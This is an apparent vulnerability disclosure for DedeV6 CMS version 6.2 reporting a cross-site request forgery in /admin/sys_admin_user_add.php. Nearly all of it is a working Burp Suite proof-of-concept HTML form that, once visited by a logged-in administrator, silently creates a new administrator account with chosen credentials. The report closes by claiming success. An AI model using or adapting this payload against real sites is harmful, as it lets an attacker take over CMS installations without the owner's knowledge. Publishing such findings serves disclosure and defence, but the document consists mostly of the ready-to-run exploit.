Target is https://github.com/DedeBIZ/DedeV6

version:6.2

DedeV6 CMS v6.2 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /admin/sys_admin_user_add.php.

![1699360243454](https://raw.githubusercontent.com/CP1379767017/cms/dreamcms_vul/dedevCMS/images/dedevCMS6_Add_Administrator01.png)

create poc

![图片](https://raw.githubusercontent.com/CP1379767017/cms/dreamcms_vul/dedevCMS/images/dedevCMS6_Add_Administrator02.png)


```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://dedev/admin/sys_admin_user_add.php" method="POST">
      <input type="hidden" name="&#95;csrf&#95;token" value="4865b0169e2d05daed5c1fc387b7b01f" />
      <input type="hidden" name="dopost" value="add" />
      <input type="hidden" name="userid" value="verify" />
      <input type="hidden" name="uname" value="verify" />
      <input type="hidden" name="pwd" value="verify" />
      <input type="hidden" name="usertype" value="10" />
      <input type="hidden" name="typeids&#91;&#93;" value="0" />
      <input type="hidden" name="tname" value="verify" />
      <input type="hidden" name="email" value="verify&#64;gmail&#46;com" />
      <input type="hidden" name="safecode" value="2ab53885e6a4f85e0a935c2f" />
      <input type="hidden" name="randcode" value="27950" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

![图片](https://raw.githubusercontent.com/CP1379767017/cms/dreamcms_vul/dedevCMS/images/dedevCMS6_Add_Administrator03.png)

successed

![图片](https://raw.githubusercontent.com/CP1379767017/cms/dreamcms_vul/dedevCMS/images/dedevCMS6_Add_Administrator04.png)
